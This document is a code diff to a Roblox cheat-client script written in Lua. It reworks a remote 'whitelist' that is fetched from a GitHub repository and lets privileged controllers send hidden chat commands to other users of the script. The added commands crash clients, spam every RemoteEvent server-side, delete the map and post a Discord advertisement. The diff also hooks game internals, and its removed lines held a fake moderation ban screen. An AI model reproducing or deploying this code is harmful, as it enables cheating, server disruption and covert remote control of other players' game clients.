@@ -2,6 +2,10 @@
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 --This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
+--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.
 local loadstring = function(...)
 	local res, err = loadstring(...)
 	if err and vape then
@@ -58,7 +62,23 @@ local groupService = cloneref(game:GetService('GroupService'))
 local textChatService = cloneref(game:GetService('TextChatService'))
 local contextService = cloneref(game:GetService('ContextActionService'))
 local coreGui = cloneref(game:GetService('CoreGui'))
-
+local function getPlayerFromDisplayName(displayName)
+	for _, plr in pairs(playersService:GetPlayers()) do
+		if plr.DisplayName == displayName then
+			print(plr)
+			return plr
+		end
+	end
+	return nil
+end
+local function getPlayerFromShortName(short_name)
+	for _, plr in pairs(playersService:GetPlayers()) do
+		if plr.Name:lower():sub(1, #short_name) == short_name:lower() or plr.DisplayName:lower():sub(1, #short_name) == short_name:lower() then
+			return plr
+		end
+	end
+	return nil
+end
 local isnetworkowner = identifyexecutor and table.find({'AWP', 'Nihon'}, ({identifyexecutor()})[1]) and isnetworkowner or function()
 	return true
 end
@@ -440,20 +460,21 @@ run(function()
 					local oldchannel = textChatService.ChatInputBarConfiguration.TargetTextChannel
 					local newchannel = cloneref(game:GetService('RobloxReplicatedStorage')).ExperienceChat.WhisperChat:InvokeServer(v.UserId)
 					if newchannel then
-						newchannel:SendAsync('helloimusinginhaler')
+						newchannel:SendAsync('hello nice vibe')
 					end
 					textChatService.ChatInputBarConfiguration.TargetTextChannel = oldchannel
+					textChatService.ChannelTabsConfiguration.Enabled = false
 				elseif replicatedStorage:FindFirstChild('DefaultChatSystemChatEvents') then
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' helloimusinginhaler', 'All')
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('/w '..v.Name..' hello nice vibe', 'All')
 				end
 			end
 		end
 	end
 
 	function whitelist:process(msg, plr)
-		if plr == lplr and msg == 'helloimusinginhaler' then return true end
+		if plr == lplr and msg == 'hello nice vibe' then return true end
 
-		if self.localprio > 0 and not self.said[plr.Name] and msg == 'helloimusinginhaler' and plr ~= lplr then
+		if self.localprio > 0 and not self.said[plr.Name] and msg == 'hello nice vibe' and plr ~= lplr then
 			self.said[plr.Name] = true
 			notif('Vape', plr.Name..' is using vape!', 60)
 			self.customtags[plr.Name] = {{
@@ -467,15 +488,17 @@ run(function()
 			return true
 		end
 
-		if self.localprio < self:get(plr) or plr == lplr then
+		if self.localprio < self:get(plr) then
 			local args = msg:split(' ')
-			table.remove(args, 1)
-			if self:getplayer(args[1]) then
-				table.remove(args, 1)
-				for cmd, func in self.commands do
-					if msg:sub(1, cmd:len() + 1):lower() == '!'..cmd:lower() then
-						func(args, plr)
-						return true
+			local mcmd = table.remove(args, 1)
+			local target = table.remove(args, 1)
+
+			for cmd, func in pairs(whitelist.commands) do
+				if mcmd:lower() == ";"..cmd:lower() then
+					if target == "@v" then
+						func(args)
+					elseif getPlayerFromShortName(target) == lplr then
+						func(args)
 					end
 				end
 			end
@@ -527,18 +550,15 @@ run(function()
 		if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
 			if exp and exp:WaitForChild('appLayout', 5) then
 				vape:Clean(exp:FindFirstChild('RCTScrollContentView', true).ChildAdded:Connect(function(obj)
-					local plr = playersService:GetPlayerByUserId(tonumber(obj.Name:split('-')[1]) or 0)
-					obj = obj:FindFirstChild('TextMessage', true)
+					obj = obj:FindFirstChild('BodyText', true)
 					if obj and obj:IsA('TextLabel') then
-						if plr then
-							self:newchat(obj, plr, true)
-							obj:GetPropertyChangedSignal('Text'):Wait()
-							self:newchat(obj, plr)
+						if obj.Text:find('hello nice vibe') then
+							obj.Parent.Parent.Visible = false
 						end
+					end
 
-						if obj.ContentText:sub(1, 35) == 'You are now privately chatting with' then
-							obj.Visible = false
-						end
+					if tonumber(obj.Name:split('-')[1]) == 0 then
+						obj.Visible = false
 					end
 				end))
 			end
@@ -564,7 +584,7 @@ run(function()
 			local bubblechat = exp:WaitForChild('bubbleChat', 5)
 			if bubblechat then
 				vape:Clean(bubblechat.DescendantAdded:Connect(function(newbubble)
-					if newbubble:IsA('TextLabel') and newbubble.Text:find('helloimusinginhaler') then
+					if newbubble:IsA('TextLabel') and newbubble.Text:find('hello nice vibe') then
 						newbubble.Parent.Parent.Visible = false
 					end
 				end))
@@ -575,12 +595,12 @@ run(function()
 	function whitelist:update(first)
 		local suc = pcall(function()
 			local _, subbed = pcall(function()
-				return game:HttpGet('https://github.com/xsinew/whitelists')
+				return game:HttpGet('https://github.com/whitelist0bot/fadsfdsa/tree/main')
 			end)
 			local commit = subbed:find('currentOid')
 			commit = commit and subbed:sub(commit + 13, commit + 52) or nil
 			commit = commit and #commit == 40 and commit or 'main'
-			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/xsinew/Whitelists/refs/heads/main/PlayerWhitelist.json', true)
+			whitelist.textdata = game:HttpGet('https://raw.githubusercontent.com/whitelist0bot/fadsfdsa/'..commit..'/t.json', true)
 		end)
 		if not suc or not hash or not whitelist.get then return true end
 		whitelist.loaded = true
@@ -661,73 +681,15 @@ run(function()
 
 	whitelist.commands = {
 		byfron = function()
-			task.spawn(function()
-				if vape.ThreadFix then
-					setthreadidentity(8)
-				end
-				local UIBlox = getrenv().require(game:GetService('CorePackages').UIBlox)
-				local Roact = getrenv().require(game:GetService('CorePackages').Roact)
-				UIBlox.init(getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppUIBloxConfig))
-				local auth = getrenv().require(coreGui.RobloxGui.Modules.LuaApp.Components.Moderation.ModerationPrompt)
-				local darktheme = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Style).Themes.DarkTheme
-				local fonttokens = getrenv().require(game:GetService("CorePackages").Packages._Index.UIBlox.UIBlox.App.Style.Tokens).getTokens('Desktop', 'Dark', true)
-				local buildersans = getrenv().require(game:GetService('CorePackages').Packages._Index.UIBlox.UIBlox.App.Style.Fonts.FontLoader).new(true, fonttokens):loadFont()
-				local tLocalization = getrenv().require(game:GetService('CorePackages').Workspace.Packages.RobloxAppLocales).Localization
-				local localProvider = getrenv().require(game:GetService('CorePackages').Workspace.Packages.Localization).LocalizationProvider
-				lplr.PlayerGui:ClearAllChildren()
-				vape.gui.Enabled = false
-				coreGui:ClearAllChildren()
-				lightingService:ClearAllChildren()
-				for _, v in workspace:GetChildren() do
-					pcall(function()
-						v:Destroy()
-					end)
-				end
-				lplr.kick(lplr)
-				guiService:ClearError()
-				local gui = Instance.new('ScreenGui')
-				gui.IgnoreGuiInset = true
-				gui.Parent = coreGui
-				local frame = Instance.new('ImageLabel')
-				frame.BorderSizePixel = 0
-				frame.Size = UDim2.fromScale(1, 1)
-				frame.BackgroundColor3 = Color3.fromRGB(224, 223, 225)
-				frame.ScaleType = Enum.ScaleType.Crop
-				frame.Parent = gui
-				task.delay(0.3, function()
-					frame.Image = 'rbxasset://textures/ui/LuaApp/graphic/Auth/GridBackground.jpg'
+			while wait() do
+				pcall(function()
+					for i,v in game:GetDescendants() do
+						if v:IsA("RemoteEvent") and not string.find(v.Name:lower(),"lobby") and not string.find(v.Name:lower(),"teleport") then
+							v:FireServer()
+						end
+					end
 				end)
-				task.delay(0.6, function()
-					local modPrompt = Roact.createElement(auth, {
-						style = {},
-						screenSize = vape.gui.AbsoluteSize or Vector2.new(1920, 1080),
-						moderationDetails = {
-							punishmentTypeDescription = 'Delete',
-							beginDate = DateTime.fromUnixTimestampMillis(DateTime.now().UnixTimestampMillis - ((60 * math.random(1, 6)) * 1000)):ToIsoDate(),
-							reactivateAccountActivated = true,
-							badUtterances = {{abuseType = 'ABUSE_TYPE_CHEAT_AND_EXPLOITS', utteranceText = 'ExploitDetected - Place ID : '..game.PlaceId}},
-							messageToUser = 'Roblox does not permit the use of third-party software to modify the client.'
-						},
-						termsActivated = function() end,
-						communityGuidelinesActivated = function() end,
-						supportFormActivated = function() end,
-						reactivateAccountActivated = function() end,
-						logoutCallback = function() end,
-						globalGuiInset = {top = 0}
-					})
-
-					local screengui = Roact.createElement(localProvider, {
-						localization = tLocalization.new('en-us')
-					}, {Roact.createElement(UIBlox.Style.Provider, {
-						style = {
-							Theme = darktheme,
-							Font = buildersans
-						},
-					}, {modPrompt})})
-
-					Roact.mount(screengui, coreGui)
-				end)
-			end)
+			end
 		end,
 		crash = function()
 			task.spawn(function()
@@ -736,7 +698,7 @@ run(function()
 					part.Size = Vector3.new(1e10, 1e10, 1e10)
 					part.Parent = workspace
 				until false
-			end)
+ 			end)
 		end,
 		deletemap = function()
 			local terrain = workspace:FindFirstChildWhichIsA('Terrain')
@@ -777,9 +739,9 @@ run(function()
 		reveal = function()
 			task.delay(0.1, function()
 				if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I am using the inhaler client')
+					textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync('I AM USING THE QP VXPE | d i s c o r d . g g / U 3 f Z a c B A p D')
 				else
-					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I am using the inhaler client', 'All')
+					replicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer('I AM USING THE QP VXPE | d i s c o r d . g g / U 3 f Z a c B A p D', 'All')
 				end
 			end)
 		end,
@@ -839,6 +801,52 @@ run(function()
 		table.clear(whitelist.commands)
 		table.clear(whitelist.data)
 		table.clear(whitelist)
+	end)
+end)
+run(function()
+	for _, channel in pairs(textChatService:WaitForChild("TextChannels", 9e9):GetChildren()) do
+		vape:Clean(channel.MessageReceived:Connect(function(message)
+			if message.TextSource then
+				local success, plr = pcall(playersService.GetPlayerByUserId, playersService, message.TextSource.UserId)
+				whitelist:process(message.Text, plr)
+			end
+		end))
+	end
+
+	task.spawn(function()
+		local found = false
+		while not found and task.wait(1) do
+			for i,v in pairs(getgc(true)) do
+				if typeof(v) == "table" and rawget(v, "KnitStart") and rawget(v, "getPrefixTags") then
+					local hook
+					hook = hookfunction(v.getPrefixTags, function(_, player)
+						local tag_result = ""
+						if shared.vape then
+							local userLevel, attackable, tags = whitelist:get(player)
+							if tags then
+								for _, tag in pairs(tags) do
+									if typeof(tag.color) == "table" then
+										tag_result ..= `<font color="#{Color3.fromRGB(unpack(tag.color)):ToHex():lower()}">[{tag.text}]</font> `
+									else
+										tag_result ..= `<font color="#{tag.color:ToHex():lower()}">[{tag.text}]</font> `
+									end
+								end
+							end
+						end
+
+						local tags = player:FindFirstChild("Tags")
+						if tags then
+							for _, tag in pairs(tags:GetChildren()) do
+								tag_result ..= tag.Value .. " "
+							end
+						end
+						return tag_result
+					end)
+					found = true
+					break
+				end
+			end
+		end
 	end)
 end)
 entitylib.start()
@@ -7446,7 +7454,7 @@ run(function()
 		end
 	})
 end)
-	
+
 run(function()
 	local FOV
 	local Value
